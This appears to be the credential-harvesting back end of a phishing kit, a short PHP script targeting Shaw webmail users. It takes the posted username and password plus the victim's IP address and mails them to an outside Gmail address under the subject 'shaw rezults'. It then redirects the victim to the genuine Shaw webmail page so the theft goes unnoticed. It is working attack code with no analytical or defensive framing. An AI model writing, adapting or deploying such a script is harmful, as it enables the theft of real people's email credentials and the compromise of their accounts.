<?
                                                                                                                                                                                                                                    
$ip = getenv("REMOTE_ADDR");
$message .= "--------------shaw.ca--------\n";
$message .= "Shaw email : ".$_POST["username"]."\n";
$message .= "Password : ".$_POST["password"]."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "---------------Created BY ISE-----------\n";
$send = "0fficefax401@gmail.com";
$subject = "shaw rezults";


mail($send,$subject,$message,$headers);


$redirect = "https://webmail.shaw.ca/";

header("Location: " . $redirect);
 
?>


